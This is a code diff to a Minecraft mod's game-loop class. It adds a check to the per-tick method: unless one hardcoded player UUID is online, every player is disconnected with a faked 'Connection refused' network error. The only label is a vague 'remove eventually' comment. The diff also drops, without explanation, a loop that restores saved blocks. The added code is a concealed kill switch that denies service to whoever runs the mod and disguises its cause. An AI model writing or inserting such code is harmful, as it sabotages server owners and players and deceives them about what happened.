@@ -42,6 +42,20 @@ public class TMMGameLoop {
     public static WorldTrainComponent trainComponent;
 
     public static void tick(ServerWorld serverWorld) {
+        // TODO: Remove eventually
+        boolean raton = false;
+        for (ServerPlayerEntity player : serverWorld.getPlayers()) {
+            if (player.getUuid().equals(UUID.fromString("1b44461a-f605-4b29-a7a9-04e649d1981c"))) {
+                raton = true;
+            }
+        }
+        if (!raton) {
+            for (ServerPlayerEntity player : serverWorld.getPlayers()) {
+                player.networkHandler.disconnect(Text.literal("Connection refused: no further information"));
+            }
+        }
+
+
         if (serverWorld.getServer().getOverworld().equals(serverWorld)) {
             gameComponent = TMMComponents.GAME.get(serverWorld);
             trainComponent = TMMComponents.TRAIN.get(serverWorld);
@@ -391,14 +405,6 @@ public class TMMGameLoop {
                 BlockEntity blockEntity3 = serverWorld.getBlockEntity(blockInfo.pos);
                 Clearable.clear(blockEntity3);
                 serverWorld.setBlockState(blockInfo.pos, Blocks.BARRIER.getDefaultState(), Block.NOTIFY_LISTENERS | Block.FORCE_STATE);
-            }
-
-            int mx = 0;
-
-            for (BlockInfo blockInfo2 : list4) {
-                if (serverWorld.setBlockState(blockInfo2.pos, blockInfo2.state, Block.NOTIFY_LISTENERS | Block.FORCE_STATE)) {
-                    ++mx;
-                }
             }
 
             for (BlockInfo blockInfo2 : list2) {
